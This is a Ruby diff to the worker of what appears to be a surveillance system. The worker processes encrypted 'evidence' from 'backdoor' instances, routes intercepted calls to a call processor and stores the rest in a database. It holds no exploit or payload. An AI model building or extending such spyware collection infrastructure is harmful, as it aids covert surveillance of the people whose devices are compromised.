@@ -7,6 +7,11 @@ require 'rcs-common/evidence_manager'
 
 require 'rcs-db/db_layer'
 
+# specific evidence processors
+Dir[File.dirname(__FILE__) + '/evidence/*.rb'].each do |file|
+  require file
+end
+
 module RCS
 module Worker
 
@@ -32,7 +37,7 @@ class InstanceProcessor
     trace :debug, "Evidence key #{@info['key']}"
     @key = Digest::MD5.digest @info['key']
     
-    @audio_processor = AudioProcessor.new
+    @call_processor = CallProcessor.new
   end
   
   def resume
@@ -44,7 +49,7 @@ class InstanceProcessor
   def take_some_rest
     sleep 1
     @seconds_sleeping += 1
-    trace :debug, "processor #{@id} takes some sleep [slept #{@seconds_sleeping} seconds]."
+    #trace :debug, "processor #{@id} takes some sleep [slept #{@seconds_sleeping} seconds]."
   end
   
   def put_to_sleep
@@ -63,7 +68,7 @@ class InstanceProcessor
   
   def queue(id)
     @evidences << id unless id.nil?
-    trace :info, "queueing evidence id #{id} for #{@id}"
+    #trace :info, "queueing evidence id #{id} for #{@id}"
     
     process = Proc.new do
       resume
@@ -74,46 +79,61 @@ class InstanceProcessor
           evidence_id = @evidences.shift
 
           begin
-            # get evidence and deserialize it
             start_time = Time.now
+
+            # get binary evidence
             data = RCS::EvidenceManager.get_evidence(evidence_id, @id)
             raise "Empty evidence" if data.nil?
+            
+            # deserialize binary evidence
             evidences = RCS::Evidence.new(@key).deserialize(data)
-
+            if evidences.nil?
+              trace :debug, "error deserializing evidence #{evidence_id} for backdoor #{@id}, skipping ..."
+              next
+            end
+            
             evidences.each do |evidence|
-                          
+              
+              # store evidence_id inside evidence, we need it inside processors
+              evidence.info[:db_id] = evidence_id
+              
               # delete empty evidences
               if evidence.empty?
-                RCS::EvidenceManager.del_evidence(evidence_id, @id)
+                RCS::EvidenceManager.del_evidence(evidence.info[:db_id], @id)
                 trace :debug, "deleted empty evidence for backdoor #{@id}"
                 next
               end
               
               # store backdoor instance in evidence (used when storing into db)
               evidence.info[:instance] = @id
-
+              
               # find correct processing module and extend evidence
-              mod = "#{evidence.type.to_s.capitalize}Processing"
+              mod = "#{evidence.info[:type].to_s.capitalize}Processing"
               evidence.extend eval mod if RCS.const_defined? mod.to_sym
-
               evidence.process if evidence.respond_to? :process
 
+              info = nil
+              while info.nil? do
+                info = RCS::EvidenceManager.instance_info(@id)
+              end
+
+              evidence.info[:backdoor_id] = info["bid"] unless info.nil?
+              
               case evidence.info[:type]
                 when :CALL
-                  @audio_processor.feed(evidence)
+                  @call_processor.feed(evidence)
                 else
+                  # TODO: refactor as a standalone processor (ie. CommonProcessor)
                   done = false
                   until done
                     begin
                       # TODO: gestire tutti i casi di inserimento fallito verso il DB
-                      evidence.info[:backdoor_id] = RCS::EvidenceManager.instance_info(@id)["bid"]
                       RCS::DB::DB.evidence_store(evidence)
-                      RCS::EvidenceManager.del_evidence(evidence_id, @id)
+                      RCS::EvidenceManager.del_evidence(evidence.info[:db_id], @id)
                       done = true
                     rescue Exception => e
-                      trace :debug, "[#{@id}] DB seems down, waiting for it to resume ... [#{e.message}]"
+                      trace :debug, "[#{@id}] UNRECOVERABLE MYSQL ERROR [#{e.message}, #{e.class}]"
                       trace :fatal, "EXCEPTION: " + e.backtrace.join("\n")
-                      sleep 1
                     end
                   end
               end
